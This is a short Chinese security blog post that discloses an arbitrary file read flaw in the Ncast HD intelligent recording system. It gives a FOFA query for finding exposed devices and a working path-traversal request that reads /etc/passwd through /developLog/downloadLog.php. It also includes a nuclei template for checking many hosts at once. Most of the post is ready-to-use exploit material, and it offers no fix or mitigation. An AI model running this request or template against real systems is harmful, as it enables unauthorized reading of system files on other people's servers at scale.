#  Ncast高清智能录播系统存在任意文件读取漏洞   
原创 RockSec  Rock sec   2024-05-06 20:16  
  
## 漏洞简介  
  
Ncast 录播系统能将授课或演讲者之影像、声音及上课讲义，以全硬件设备方式即时记录成标准的网络流媒体格式，并通过网络及服务器同步直播。  
## FOFA语句  
  
title=="高清智能录播系统"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9tXQ9Go8nLW3rXcLn0RzUPZia0DG42T7sibtTicnQafk2hndJvEnvJAbKdVBRlpyKn8ribicBvhjMa03micpPIreFmGA/640?wx_fmt=png&from=appmsg "")  
## 测试截图  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9tXQ9Go8nLW3rXcLn0RzUPZia0DG42T7s1h9EBoDMRNTW5dqiaib38Ria3JIzY0Rk5Hco2vdEicyTwLpEy0DmgqWAhA/640?wx_fmt=png&from=appmsg "")  
  
    **POC如下：**  
```
GET /developLog/downloadLog.php?name=../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close


```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9tXQ9Go8nLW3rXcLn0RzUPZia0DG42T7szSV1WvQ2wcN7v6KYD0UJonDGYZB1ZvtGhib3UzhQkoreZ1jwOiak0N3A/640?wx_fmt=png&from=appmsg "")  
## nuclei批量验证：  
```
id: ncast_arbitrary_file_read

info:
  name: Ncast任意文件读取漏洞
  author: maoge
  severity: high
  description: Ncast高清智能录播系统任意文件读取漏洞
  reference:
    - https://example.com/
  metadata:
    verified: true
    max-request: 1
    fofa-query: title=="高清智能录播系统"
    hunter-query: web.title=="高清智能录播系统"

http:
  - raw:
      - |
        GET /developLog/downloadLog.php?name=../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close

    max-redirects: 3
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - bin/sh
          - root
```  
  
  
  
